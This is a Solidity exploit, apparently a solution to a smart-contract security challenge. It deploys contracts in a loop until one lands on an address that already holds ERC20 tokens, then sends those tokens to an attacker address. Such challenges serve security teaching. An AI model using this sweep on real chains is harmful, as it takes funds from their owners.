// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";


contract Attack7 {
    constructor(address _attacker, IERC20 _token, uint256 _nonce) {
        // gas considered
        for (uint8 i = 0; i < _nonce; i++) {
            new GuessAndSweep(_attacker, _token);
        }
    }
}

contract GuessAndSweep {
    constructor(address _attacker, IERC20 _token) {
        uint256 balance = _token.balanceOf(address(this));
        if (balance > 0) {
            _token.transfer(_attacker, balance);
            console.log("success!");
        } 
    }
}